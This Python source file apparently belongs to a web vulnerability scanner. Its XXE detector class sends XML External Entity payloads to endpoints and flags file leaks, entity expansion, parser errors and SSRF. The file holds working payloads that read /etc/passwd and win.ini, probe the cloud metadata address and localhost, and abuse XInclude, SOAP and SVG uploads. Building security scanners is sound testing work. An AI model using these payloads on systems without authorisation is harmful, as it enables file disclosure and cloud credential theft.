import logging
import re

logger = logging.getLogger(__name__)


class XXEDetector:
    CLASSIC_PAYLOADS = [
        '<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<foo>&xxe;</foo>',
        '<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>\n<foo>&xxe;</foo>',
        '<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe "DIOGENES_XXE_TEST">]>\n<foo>&xxe;</foo>',
    ]
    
    QUICK_PAYLOADS = [
        '<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<foo>&xxe;</foo>',
        '<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe "DIOGENES_XXE_TEST">]>\n<foo>&xxe;</foo>',
    ]
    
    SSRF_PAYLOADS = [
        '<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>\n<foo>&xxe;</foo>',
        '<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:22">]>\n<foo>&xxe;</foo>',
    ]
    
    XINCLUDE_PAYLOAD = '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>'
    
    SOAP_PAYLOAD = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>'
    
    SVG_PAYLOAD = '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg width="500" xmlns="http://www.w3.org/2000/svg"><text x="0" y="20">&xxe;</text></svg>'
    
    FILE_INDICATORS = [r'root:x:0:0:', r'\[extensions\]', r'\[fonts\]', r'daemon:', r'bin:', r'nobody:']
    
    ERROR_SIGNATURES = ['xml parse', 'xml syntax', 'parsexml', 'entity', 'dtd', 'doctype', 'saxparseexception', 'simplexml', 'libxml', 'external entity']
    
    SSRF_INDICATORS = ['connection refused', 'connection timeout', 'unreachable', 'ssh-']
    
    XML_PARAMS = ['xml', 'data', 'content', 'payload', 'input', 'body', 'message']
    
    def __init__(self, client, quick_mode=False):
        self.client = client
        self.quick_mode = quick_mode
    
    def test(self, path, param=None):
        params_to_test = [param] if param else self.XML_PARAMS
        payloads = self.QUICK_PAYLOADS if self.quick_mode else self.CLASSIC_PAYLOADS
        
        for test_param in params_to_test:
            result = self._test_classic_xxe(path, test_param, payloads)
            if result:
                return result
            
            if self.quick_mode:
                continue
            
            result = self._test_ssrf_xxe(path, test_param)
            if result:
                return result
            
            result = self._test_xinclude(path, test_param)
            if result:
                return result
            
            if 'soap' in path.lower():
                result = self._test_soap_xxe(path)
                if result:
                    return result
            
            if 'upload' in path.lower() or 'image' in path.lower():
                result = self._test_svg_xxe(path, test_param)
                if result:
                    return result
        
        return None
    
    def _test_classic_xxe(self, path, param, payloads):
        for payload in payloads:
            try:
                res = self.client.post(path, data={param: payload})
                if not res:
                    continue
                
                response_text = (res.text or '').lower()
                
                for indicator in self.FILE_INDICATORS:
                    if re.search(indicator, response_text, re.IGNORECASE):
                        return {
                            "type": "xxe",
                            "xxe_type": "file_disclosure",
                            "endpoint": path,
                            "param": param,
                            "payload": payload[:80] + "...",
                            "evidence": f"File leaked: {indicator}",
                            "confidence": 0.95
                        }
                
                if 'DIOGENES_XXE_TEST' in res.text:
                    return {
                        "type": "xxe",
                        "xxe_type": "entity_expansion",
                        "endpoint": path,
                        "param": param,
                        "payload": payload[:80] + "...",
                        "evidence": "XML entity expanded",
                        "confidence": 0.90
                    }
                
                for sig in self.ERROR_SIGNATURES:
                    if sig in response_text:
                        return {
                            "type": "xxe",
                            "xxe_type": "error_based",
                            "endpoint": path,
                            "param": param,
                            "payload": payload[:80] + "...",
                            "evidence": f"XML parser error: {sig}",
                            "confidence": 0.75
                        }
            except Exception as e:
                logger.debug(f"XXE test error: {e}")
        return None
    
    def _test_ssrf_xxe(self, path, param):
        for payload in self.SSRF_PAYLOADS:
            try:
                res = self.client.post(path, data={param: payload})
                if not res:
                    continue
                
                response_text = (res.text or '').lower()
                
                for indicator in self.SSRF_INDICATORS:
                    if indicator in response_text:
                        return {
                            "type": "xxe",
                            "xxe_type": "ssrf_via_xxe",
                            "endpoint": path,
                            "param": param,
                            "evidence": f"SSRF: {indicator}",
                            "confidence": 0.85
                        }
                
                if 'meta-data' in response_text or 'latest' in response_text:
                    return {
                        "type": "xxe",
                        "xxe_type": "cloud_metadata",
                        "endpoint": path,
                        "param": param,
                        "evidence": "Cloud metadata accessible",
                        "confidence": 0.95
                    }
            except Exception:
                pass
        return None
    
    def _test_xinclude(self, path, param):
        try:
            res = self.client.post(path, data={param: self.XINCLUDE_PAYLOAD})
            if res:
                for indicator in self.FILE_INDICATORS:
                    if re.search(indicator, res.text or '', re.IGNORECASE):
                        return {
                            "type": "xxe",
                            "xxe_type": "xinclude",
                            "endpoint": path,
                            "param": param,
                            "evidence": "XInclude file disclosure",
                            "confidence": 0.90
                        }
        except Exception:
            pass
        return None
    
    def _test_soap_xxe(self, path):
        try:
            res = self.client.session.post(
                self.client.base_url + path,
                data=self.SOAP_PAYLOAD,
                headers={'Content-Type': 'text/xml'},
                timeout=10
            )
            if res:
                for indicator in self.FILE_INDICATORS:
                    if re.search(indicator, res.text or '', re.IGNORECASE):
                        return {
                            "type": "xxe",
                            "xxe_type": "soap_xxe",
                            "endpoint": path,
                            "evidence": "SOAP XXE file disclosure",
                            "confidence": 0.95
                        }
        except Exception:
            pass
        return None
    
    def _test_svg_xxe(self, path, param):
        try:
            files = {param: ('test.svg', self.SVG_PAYLOAD, 'image/svg+xml')}
            res = self.client.session.post(self.client.base_url + path, files=files, timeout=10)
            if res:
                for indicator in self.FILE_INDICATORS:
                    if re.search(indicator, res.text or '', re.IGNORECASE):
                        return {
                            "type": "xxe",
                            "xxe_type": "svg_xxe",
                            "endpoint": path,
                            "param": param,
                            "evidence": "SVG XXE file disclosure",
                            "confidence": 0.90
                        }
        except Exception:
            pass
        return None
